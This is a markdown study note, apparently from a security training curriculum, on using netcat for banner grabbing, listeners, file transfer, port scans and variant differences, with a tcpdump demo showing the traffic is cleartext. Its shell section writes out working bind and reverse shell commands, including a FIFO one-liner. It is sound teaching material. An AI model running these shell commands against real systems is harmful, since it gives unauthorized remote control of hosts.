---
tags: [jcu, module3, recon, networking]
jqr: "Netcat — raw TCP/UDP read/write: banner grab, listeners, file transfer, port checks, bind/reverse shells, and variant differences"
---

# Netcat

Netcat pipes stdin/stdout across a raw TCP or UDP socket — whatever you type goes down the wire, whatever comes back prints to your screen. That one trick makes it a banner-grabber, listener, file-transfer tool, port-checker, and shell handler. It does **no encryption**, which is exactly why [Tcpdump](Tcpdump.md) can read everything it sends (see the demo below).

## TL;DR

```bash
nc -nv 192.168.1.20 22                 # banner grab — server speaks first, IDs service/version
nc -lvnp 4444                          # listener: -l listen, -v verbose, -n no DNS, -p port
nc -nv 192.168.1.20 4444               # connect to a listener (chat / send data)
nc -lvnp 4444 > out.bin                # receive a file …
nc -nv -N 192.168.1.20 4444 < in.bin   # … send it (-N closes socket at EOF so it flushes)
nc -zvn -w1 192.168.1.20 20-100        # cheap port scan from a box with no Nmap (-z = no data)
```

- **Know your variant first:** `nc -h 2>&1 | head -1`. It decides whether `-e` and `-z` even exist.
- **Kali/Debian/Ubuntu default = OpenBSD nc → NO `-e`.** For a shell use the FIFO trick or `ncat`.
- **Only `ncat --ssl` encrypts.** Plain `nc` is cleartext, always.

## Concept

A socket is just a two-way pipe between two hosts. Netcat hands you that pipe raw, with nothing wrapped around it — no TLS, no auth, no framing. So "connecting to port 4444" and "connecting to an SSH server" look identical to netcat; the difference is only what the *other end* does with your bytes. For a defender that's the key mental hook: netcat traffic is your own keystrokes on the wire, in the clear, which is why it's both a great diagnostic and a classic post-exploitation tool.

## Variants — the JQR gotcha (OpenBSD vs Traditional vs Ncat)

| Variant | Package | `-e` (exec)? | `-z` (scan)? | Notable |
|---|---|---|---|---|
| **OpenBSD nc** | `netcat-openbsd` | **NO** (removed for security) | **Yes** | **Default on Kali/Debian/Ubuntu.** Has `-N`, `-k`, `-w`, `-u`. No SSL. |
| **Traditional nc** | `netcat-traditional` (`nc.traditional`) | **YES** (`-e`, `-c`) | **Yes** | The classic "GAPING_SECURITY_HOLE" build. |
| **Ncat (Nmap)** | `ncat` (ships with nmap) | **YES** (`-e`, `--sh-exec`) | **NO** | Modern rewrite. Adds **`--ssl` (encryption)**, `-k`, `--chat`, `--broker`. |

**Tell which one you have:** `nc -h 2>&1 | head -1`
- Ncat → banner says `Ncat ... ( https://nmap.org/ncat )`
- OpenBSD → man page states *"There is no -c or -e option in this netcat."*
- Traditional → usage line `connect to somewhere: nc [-options] hostname port ...`

> **Why it matters:** on an OpenBSD-nc box, `nc -e /bin/bash` **fails** — use the FIFO workaround (below) or `ncat --exec`. And Ncat has **no `-z`**, so use Nmap or `ncat --recv-only host port </dev/null` to check ports there.

## Core flags

| Flag | Meaning |
|---|---|
| `-l` | Listen (server/bind mode). |
| `-p <port>` | Port (source port; the listen port in `-l` mode). |
| `-v` / `-vv` | Verbose — shows connection status. |
| `-n` | Numeric only, no DNS (faster, quieter). |
| `-u` | UDP instead of TCP. |
| `-w <sec>` | Connect/idle timeout. |
| `-z` | Zero-I/O — check the port, send no data (scan). *OpenBSD/Traditional only.* |
| `-k` | Keep listening after a client disconnects (OpenBSD/Ncat). |
| `-N` | Close the socket on EOF (OpenBSD) — needed so file transfers finish cleanly. |
| `-e <prog>` | Exec program on connect. *Traditional/Ncat only.* |

## Banner grabbing

```bash
nc -nv 192.168.1.20 22                          # → "SSH-2.0-OpenSSH_9.6" — service + version
printf 'HEAD / HTTP/1.0\r\n\r\n' | nc -nv 192.168.1.20 80   # → HTTP response headers (Server:, etc.)
```
→ Fast manual alternative to `nmap -sV` for a single port. SSH/FTP/SMTP speak first; HTTP needs you to send the request.

## Listener + client

```bash
# TARGET (192.168.1.20): start a listener on 4444
nc -lvnp 4444
# ATTACKER (192.168.1.10): connect to it
nc -nv 192.168.1.20 4444
```
→ Anything typed on one side appears on the other. `-v` printing `Connection ... succeeded!` alone proves TCP reachability to that port.

> **OpenBSD strictness:** pure OpenBSD nc wants the listen port as a positional arg (`nc -lvn 4444`); Kali's build also accepts `-lvnp 4444`. If `-p` errors, drop it and put the port last.

## File transfer

```bash
nc -lvnp 4444 > received.bin                 # RECEIVER writes incoming bytes to a file
nc -nv -N 192.168.1.20 4444 < tosend.bin     # SENDER pipes the file in; -N closes at EOF
```
→ Direction is just plumbing: `<` reads a file *into* the socket, `>` writes the socket *to* a file. Either host can be the listener. Verify with `sha256sum` on both ends afterward.

## Port checks (`-z`)

```bash
nc -zvn -w1 192.168.1.20 22        # single port → "... 22 port [tcp/ssh] succeeded!" = open
nc -zvn -w1 192.168.1.20 20-1024   # sweep a range, 1-sec timeout each
```
→ Quick reachability check from a foothold box with no Nmap. **Ncat has no `-z`** — see the variant note.

## telnet — use case & limitations (JQR)

`telnet` opens a raw, interactive TCP connection to a host/port — the older cousin of netcat.

```bash
telnet 192.168.1.20 25        # SMTP — read the banner, type HELO / MAIL FROM manually
telnet 192.168.1.20 80        # then: GET / HTTP/1.0  <Enter><Enter>  → HTTP headers
```
→ **Use case:** fast banner grab or hand-poking a *text* protocol (SMTP, HTTP, POP3, IMAP) to confirm a port answers and see how it responds.
→ **Limitations:** **no encryption** — everything (including any login) is cleartext on the wire, provable with the same [Tcpdump](Tcpdump.md) capture as netcat. It can't transfer files cleanly, and as a *login service* (telnetd on port 23) it's obsolete and unsafe — **SSH replaced it** for exactly that reason. The client is often not installed on modern boxes (`sudo apt install telnet`). Use it to *diagnose*, never to *authenticate*.

## The shell trick (bind vs reverse) + the OpenBSD workaround

A **bind** shell = target listens and hands out a shell. A **reverse** shell = target dials *back* to you; it beats inbound firewalls because outbound is usually allowed. Lab/authorized boxes only.

> 🧪 **Run this on your lab** — verified against current docs, confirm on your box (needs two hosts):
```bash
# BIND shell (Traditional/Ncat only — OpenBSD nc has no -e):
#   TARGET:   nc -lvnp 4444 -e /bin/bash        (or: ncat -lvnp 4444 -e /bin/bash)
#   ATTACKER: nc -nv 192.168.1.20 4444          → you land in the target's shell

# REVERSE shell (target connects out to you):
#   ATTACKER: nc -lvnp 4444
#   TARGET:   nc -nv 192.168.1.10 4444 -e /bin/bash

# OpenBSD nc has NO -e → named-pipe (FIFO) workaround on the TARGET:
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
```

## Prove plain netcat is UNENCRYPTED

The core traffic-analysis exercise: a plaintext `nc` listener, a client that sends a "secret," and [Tcpdump](Tcpdump.md) watching the wire. The captured payload equals exactly what was typed — that *is* the proof.

```bash
# 1) TARGET: plaintext listener            nc -lvnp 4444
# 2) CAPTURE: watch the port, print ASCII   sudo tcpdump -ni eth0 -A 'tcp port 4444'
# 3) ATTACKER: connect and send a secret    nc -nv 192.168.1.20 4444   (then type the secret)
```

> ✅ **Tested output** (Ubuntu 24.04, 2026) — `nc` listener on 4444 with `tcpdump` on the loopback; the secret is plainly readable in the capture:
```
--- what the listener received ---
PASSWORD=SuperSecret123 sent over netcat
--- what tcpdump saw on the wire (note cleartext) ---
gD'.gD'.PASSWORD=SuperSecret123 sent over netcat

04:02:18.984271 IP 127.0.0.1.4444 > 127.0.0.1.43044: Flags [.], ack 42, win 64, options [nop,nop,TS val 1732519726 ecr 1732519726], length 0
```
The leading `gD'.` bytes are captured TCP/framing noise; the `PASSWORD=SuperSecret123` string is your payload, on the wire in the clear. Lesson for the panel: **the network encrypts nothing — the application must.** Same reason Telnet/FTP/HTTP are unsafe and SSH/HTTPS exist.

**The contrast:** repeat with `ncat --ssl -lvnp 4444` (target) and `ncat --ssl -nv 192.168.1.20 4444` (attacker) and tcpdump now shows a TLS handshake then encrypted gibberish — the secret is gone from view. `ncat --ssl` is the *only* netcat that does this.

## Exam tips & gotchas

- **Identify the variant first** (`nc -h 2>&1 | head -1`) — it decides whether `-e` and `-z` exist.
- **Kali default = OpenBSD → no `-e`.** FIFO trick or `ncat --exec`.
- **`-N` (or `-q 0` on some builds)** so file transfers / `printf` pipes actually close and flush.
- **Plain nc is cleartext** — anyone with tcpdump on-path reads it. Only `ncat --ssl` encrypts.
- **Listener needs the port free**, and ports <1024 need **root** to bind.
- **Reverse beats bind** through inbound firewalls, because outbound is usually permitted.

## References

- NoobLinux netcat tutorial (JQR-named): https://nooblinux.com/how-to-use-netcat/
- Ncat guide + man page: https://nmap.org/ncat/guide/ · https://nmap.org/book/ncat-man.html
- OpenBSD `nc(1)` (the "no -c or -e" default): https://man.openbsd.org/nc.1 · https://manpages.debian.org/bookworm/netcat-openbsd/nc.1.en.html

## Related

- [Nmap](Nmap.md)
- [Tcpdump](Tcpdump.md)
- [SSH - Tunneling and Jump Hosts](SSH%20-%20Tunneling%20and%20Jump%20Hosts.md)
- [Metasploit Workflow](../05%20-%20Metasploit%20and%20Exploitation/Metasploit%20Workflow.md)
- [Pivoting and Tunneling](../06%20-%20Knowledge%20Requirements/Pivoting%20and%20Tunneling.md)
